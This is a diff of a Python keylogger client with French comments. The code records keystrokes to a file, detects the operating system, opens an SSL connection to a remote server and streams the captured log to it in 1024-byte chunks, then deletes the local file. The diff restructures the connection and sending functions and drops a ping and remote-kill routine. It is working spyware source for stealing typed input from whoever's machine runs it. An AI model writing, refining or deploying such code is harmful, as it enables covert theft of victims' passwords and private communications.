@@ -1,4 +1,4 @@
-import platform, os, ctypes, socket, ssl, time, ping3
+import platform, os, ctypes, socket, ssl, time
 
 # Fonction création simple du fichier
 def creation_fichier(nom_fichier, sys):
@@ -21,14 +21,6 @@ def creation_fichier(nom_fichier, sys):
             print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
     else:
         pass
-
-# Fonction suppression du fichier
-def suppression_fichier(file_path):
-    try:
-        # Supprimer le fichier
-        os.remove(file_path)
-    except Exception as e:
-        print(f"Erreur lors de la suppression du fichier : {e}")
 
 # Fonction pour écrire les frappes dans le fichier
 def touche_fichier(file_path, event):
@@ -65,9 +57,25 @@ def detect_os():
         return "Windows"
     else :
         return "Other"
-
+    
 # Fonction de client
-def client(file_path, ip_server, port):
+def client(file_path, client_ssl):
+    try :
+        # Ouvrir le fichier en mode lecture binaire
+        with open(file_path, "rb") as f:
+            # Lire les données du fichier
+            data = f.read(1024)
+            while data:
+                # Envoyer les données au serveur
+                client_ssl.send(data)
+                # Lire les données du fichier
+                data = f.read(1024)
+    except Exception as e:
+        print(f"Erreur lors de l'envoi du fichier : {e}")
+
+    client_ssl.close()
+
+def connexion(ip_server, port, return_queue):
     # Paramètres du serveur
     server_address = (ip_server, port)
 
@@ -80,66 +88,24 @@ def client(file_path, ip_server, port):
     try :
         # Connecter ssl
         client_ssl.connect(server_address)
-
-        # Arrêter le programme et supprimer le fichier si l'option -k est utilisée
-        command = client_ssl.recv(1024)
-        if command == "kill":
-            kill(file_path)
-
-        # Ouvrir le fichier en mode lecture binaire
-        with open(file_path, "rb") as f:
-            # Lire les données du fichier
-            data = f.read(1024)
-            while data:
-                # Envoyer les données au serveur
-                client_ssl.send(data)
-                # Lire les données du fichier
-                data = f.read(1024)
-
-        # Fermer la connexion
-        client_ssl.close()
+        print("Connexion établie !")
+        return_queue.put(client_ssl)
     except Exception as e:
-        print(f"Erreur lors de l'envoi du fichier : {e}")
-
-# La fonction de ping du serveur
-def ping(ip_server):
-    while True:
-        if ping3.ping(ip_server) == None:
-            time.sleep(10)
-            if ping3.ping(ip_server) == None:
-                print("Le serveur n'est pas joignable, arrêt du programme")
-                exit()
-        else:
-            time.sleep(10)
-
-# Fonction si réception de la commande kill
-def kill(file_path):
-    # Arrêter le programme et supprimer le fichier
-    os.remove(file_path)
-    print("Le programme a été arrêté et le fichier supprimé !")
-    exit()
-
-# Fonction de connexion au serveur
-def connexion(ip_server, port, resultat):
-    # Paramètres du serveur
-    server_address = (ip_server, port)
-
-    # Création du socket
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Création du socket SSL
-    client_ssl = ssl.wrap_socket(client_socket,ca_certs="certificat.pem")
-
-    # Essayer de se connecter au serveur. S'il est toujours injoignable au bout de 10 minutes, le programme s'arrête
-    try:
-        # Connexion ssl
-        client_ssl.connect(server_address)
-    except Exception as e:
-        print(f"Erreur lors de la connexion au serveur : {e}")
-        time.sleep(10)
-        try : 
+        print(f"Le serveur ne semble pas être disponible pour le moment : {e}")
+        time.sleep(5)
+        try :
+            # Connecter ssl
             client_ssl.connect(server_address)
+            print("Connexion établie !")
+            return_queue.put(client_ssl)
         except Exception as e:
-            print("Le serveur n'est pas joignable, arrêt du programme")
-            # retourner resultat
-            resultat.put("exit")
+            print(f"ERREUR FATALE | Le serveur n'est pas disponible : {e}")
+            return_queue.put("exit")
+
+# Fonction de suppression de fichier
+def suppression_fichier(file_path):
+    try:
+        os.remove(file_path)
+        print("Fichier supprimé !")
+    except Exception as e:
+        print(f"Erreur lors de la suppression du fichier : {e}")
